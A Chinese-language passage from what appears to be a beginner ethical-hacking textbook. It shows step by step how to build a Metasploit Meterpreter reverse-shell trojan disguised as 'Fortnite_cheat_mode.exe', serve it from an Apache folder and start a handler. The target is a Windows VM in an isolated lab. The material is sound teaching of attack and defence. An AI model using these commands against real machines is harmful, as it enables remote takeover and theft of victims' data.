
# 引言

在本章中，你将在 Kali VM 上安全地创建一个病毒，并在虚拟网络中感染你的 Windows VM。然后你将从 Kali 工作站控制 Windows VM 并窃取数据、击键记录、网络摄像头视频等——就像攻击者那样。你将负责任地进行操作，以确保恶意软件不会逃逸到虚拟环境之外。在此过程中，你将学习如何保护自己免受互联网上大多数恶意软件的侵害。

为了执行我们的攻击，我们将使用 Kali 最著名的工具之一，`Metasploit`。`Metasploit Framework` 是由计算机安全公司 Rapid7 维护的开源渗透测试工具包。它被称为框架，因为它是一个用于开发、测试和执行漏洞利用的完整软件平台。`exploit` 是一种旨在利用计算机系统漏洞的攻击。

`Metasploit` 被称为黑客的瑞士军刀，因为它内置了许多有用的工具。事实上，`Metasploit` 包含多达 2,000 个漏洞利用，数量还在增长，其中包括针对 Windows、macOS、Linux、Microsoft Office、Adobe 产品、大多数浏览器、iOS、Android 等的漏洞利用。

## 构建你自己的病毒

我们将开始在 Kali VM 上构建恶意软件，以通过我们在第 3 章中创建的 PublicNAT 网络接管 Windows VM。具体来说，我们将创建一个 `trojan`，一种看起来无害但可以让攻击者控制你的计算机的恶意软件。特洛伊木马有时被称为 `remote access trojans` (`RATs`)，因为它们允许攻击者通过互联网从世界任何地方控制目标计算机——无需物理访问。

特洛伊木马通常伪装成人们会想下载并运行的文件，例如最新热门歌曲或电影的盗版副本，或流行视频游戏的作弊程序。作为示例，我们将我们的特洛伊木马命名为 `Fortnite_cheat_mode.exe`。登录你的 Kali VM，让我们创建一些恶意软件吧！你可能会惊讶于它的简单。

1. 在你的 Kali VM 中，点击左上角的 Kali 图标并前往 **08 - 利用工具**▶**Metasploit 框架**。如果要求输入 sudo 密码，请输入 `kali`。`Metasploit Framework` 控制台 (`msfconsole`) 将启动，通常在顶部显示有趣的 ASCII 文本艺术，如 [图 6-1](#c06.xhtml#figure6-1) 所示。

2. 你应该会看到标记为 `msf6 >` 的命令提示符，简称为“Metasploit Framework，版本 6”。输入 `ip addr` 来检查 Kali VM 的 IP 地址并确保它已连接到 PublicNAT 网络：

```
msf6 > ip addr
```

![图 6-1：Metasploit Framework 控制台的启动信息，底部左侧为 Metasploit msf6 > 命令提示符](image_fi/502000c06/f06001.png)

图 6-1：Metasploit Framework 控制台的启动信息，底部左侧为 Metasploit `msf6 >` 命令提示符

3. 在 `eth0:` 部分下查找以 `inet` 开头后跟 IP 地址的行：

```
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 08:00:27:23:ff:90 brd ff:ff:ff:ff:ff:ff inet 10.0.9.x/24 brd 10.0.9.255 scope global noprefixroute eth0 1
```

只要地址以 `10.0.9` 开头 1，你就处于第 3 章中创建的 PublicNAT 网络中，可以开始了。记下 IP 地址；你需要在多个命令中输入它。如果未看到 `10.0.9.x` 作为你的 IP 地址，请返回第 3 章第 26 页创建 PublicNAT 网络，或第 27 页正确将 Kali VM 连接到该网络。

4. 输入以下两行，将 IP 地址中的 `x` 替换为刚刚查找的数字：

```
msf6 > msfvenom  -p  windows/meterpreter/reverse_tcp  \ > LHOST=10.0.9.x  -f  exe  -o  ~/Desktop/Fortnite_cheat_mode.exe
```

5. 你现在应该在桌面上看到一个名为 `Fortnite_cheat_mode.exe` 的文件，如 [图 6-2](#c06.xhtml#figure6-2) 所示。如果看不到该文件，请打开文件资源管理器并前往 `/home/kali/Desktop/` 查找它。

![图 6-2：msfvenom 工具创建名为 Fortnite_cheat_mode.exe 的特洛伊木马并将其放置在桌面（左下角）](image_fi/502000c06/f06002.png)

图 6-2：`msfvenom` 工具创建名为 `Fortnite_cheat_mode.exe` 的特洛伊木马并将其放置在桌面（左下角）。

你现在已经创建了你的第一个特洛伊木马——做得好！所有操作仅需在步骤 4 中在 `msf6 >` 命令提示符下输入的两行即可。实际上，它只是一个长命令，但第一行末尾的反斜杠 (`\`) 让我们可以将命令继续到第二行。

这个命令到底做了什么？它告诉 `Metasploit` 的 `msfvenom` 工具创建一个包含 `Meterpreter` shell 的恶意软件，该接口将使我们能够从 Kali 对 Windows VM 进行命令行（shell）控制。我们通过键入 `LHOST=` 后跟 Kali VM 的 IP 地址来告诉 `Meterpreter` shell 从哪里接收命令。`-f` `exe` 选项告诉 `msfvenom` 输出的格式 (`-f`) 应为 Windows 可执行 (`exe`) 程序文件。`-o` 选项告诉 `msfvenom` 输出文件的名称和位置：一个名为 `Fortnite_cheat_mode.exe` 的文件，保存到桌面 (`~/Desktop/`)。

### 共享恶意软件

现在我们有了特洛伊木马 Windows 可执行文件，我们需要将其放到你的 Windows VM 上。通常攻击者会尝试通过电子邮件发送特洛伊木马，但许多电子邮件程序会扫描附件中的恶意软件，而且你也不想通过个人电子邮件账户发送特洛伊木马。相反，我们将创建一个共享文件夹，Windows 用户可以通过其网络浏览器浏览该文件夹。

1. 在 `msfconsole` 窗口中输入此命令，在大多数 Linux 计算机上共享网络文件夹的默认位置创建一个名为 `share` 的文件夹：

```
msf6 > sudo mkdir /var/www/html/share
```

2. 将特洛伊木马复制到新文件夹：

```
msf6 > sudo cp ~/Desktop/Fortnite_cheat_mode.exe /var/www/html/share
```

3. 启动 `Apache` Web 服务器应用程序，以便文件夹可以通过网络访问：

```
msf6 > sudo service apache2 start
```

4. 为确认特洛伊木马现在可供下载，请在 Kali VM 中打开网络浏览器并前往 `http://<10.0.9.x>/share`，将 `<10.0.9.x>` 替换为你的 Kali VM 的 IP 地址。你将看到类似 [图 6-3](#c06.xhtml#figure6-3) 所示的网页。

![图 6-3：多亏了 Kali 的 Apache Web 服务器，我们的特洛伊木马恶意软件现在可在（虚拟）网络上使用！](image_fi/502000c06/f06003.png)

图 6-3：多亏了 Kali 的 Apache Web 服务器，我们的特洛伊木马恶意软件现在可在（虚拟）网络上使用！

### 监听特洛伊木马回连

我们现在需要准备 `Metasploit` 以接收来自受感染 Windows 机器的传入连接（我们有时称之为 `phoning home`）。传入连接将使我们能够发送恶意命令远程控制机器。通常，攻击者会向数千名潜在受害者发送病毒邮件附件，等待其中哪些人打开附件并被感染。在我们的例子中，我们只感染一台 Windows VM。然而，通过遵循这些步骤，我们可以同样轻松地接收用于同时控制多台受感染计算机的连接。

1. 在 `msf6 >` 提示符下输入此命令，告诉 `Metasploit` 处理或接受来自受感染计算机的多个传入连接：

```
msf6 > use exploit/multi/handler
```

`msfconsole` 提示符将更改以告知我们 `multi/handler` 漏洞利用已激活。

2. 现在告诉 `Metasploit` 特洛伊木马的 `payload`——即我们交付的恶意程序——是一个 `Meterpreter` shell：

```
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
```

`msfconsole` 将回复 `PAYLOAD => windows/meterpreter/reverse_tcp` 以告知我们已选择 Meterpreter 有效载荷。

